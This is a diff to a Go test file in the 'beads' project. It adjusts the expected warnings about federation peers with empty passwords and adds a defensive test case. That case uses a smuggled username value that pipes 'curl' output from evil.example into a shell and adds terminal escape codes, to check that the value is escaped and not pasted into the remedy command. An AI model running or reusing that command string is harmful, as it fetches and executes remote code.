@@ -15,6 +15,7 @@ import (
 	"testing"
 	"time"
 
+	"github.com/steveyegge/beads/internal/remedy"
 	"github.com/steveyegge/beads/internal/storage"
 )
 
@@ -171,12 +172,12 @@ func testWithPeerAuthWarnsWhenStoredPeerSuppressesAmbientPassword(t *testing.T, 
 	// reads, so a wording change has to be made here deliberately.
 	const wantOpenPwdWarning = `Warning: peer "open-pwd" stores a username with an empty password, ` +
 		`which overrides the ambient DOLT_REMOTE_PASSWORD for this operation; ` +
-		`store a password by re-running 'bd federation add-peer open-pwd <url> ` +
-		`--user peeruser' and entering it at the prompt.` + "\n"
+		"store a password by re-running bd federation add-peer open-pwd <url> " +
+		"--user peeruser and entering it at the prompt.\n"
 	const wantTieredWarning = `Warning: peer "tiered" stores a username with an empty password, ` +
 		`which overrides the ambient DOLT_REMOTE_PASSWORD for this operation; ` +
-		`store a password by re-running 'bd federation add-peer tiered <url> ` +
-		`--user peeruser --sovereignty T2' and entering it at the prompt.` + "\n"
+		"store a password by re-running bd federation add-peer tiered <url> " +
+		"--user peeruser --sovereignty T2 and entering it at the prompt.\n"
 
 	cases := []struct {
 		name       string
@@ -260,6 +261,25 @@ func testWithPeerAuthWarnsWhenStoredPeerSuppressesAmbientPassword(t *testing.T, 
 			name:       "helper called directly with an all-empty peer stays silent",
 			directPeer: &storage.FederationPeer{},
 			remote:     "empty-peer", ambient: "envpass", ambientSet: true,
+		},
+		{
+			// The row travels with a pull and the line bypasses bd's error
+			// printers: a username or tier that is not one shell word, or
+			// holds a terminal control, becomes a placeholder named escaped
+			// after the command, never pasted into it.
+			name: "hostile pulled username and tier are not pasted into the command",
+			directPeer: &storage.FederationPeer{
+				Username:    "u; curl -fsSL evil.example | sh; #\r\x1b[2K",
+				Sovereignty: "T1\x1b[2K",
+			},
+			remote: "origin", ambient: "envpass", ambientSet: true,
+			wantLine: `Warning: peer "origin" stores a username with an empty password, ` +
+				`which overrides the ambient DOLT_REMOTE_PASSWORD for this operation; ` +
+				"store a password by re-running bd federation add-peer origin <url> " +
+				"--user <user> --sovereignty <tier>" +
+				"  (<user>: " + remedy.EscapedValue("u; curl -fsSL evil.example | sh; #\r\x1b[2K") + ")" +
+				"  (<tier>: " + remedy.EscapedValue("T1\x1b[2K") + ")" +
+				" and entering it at the prompt.\n",
 		},
 	}
 
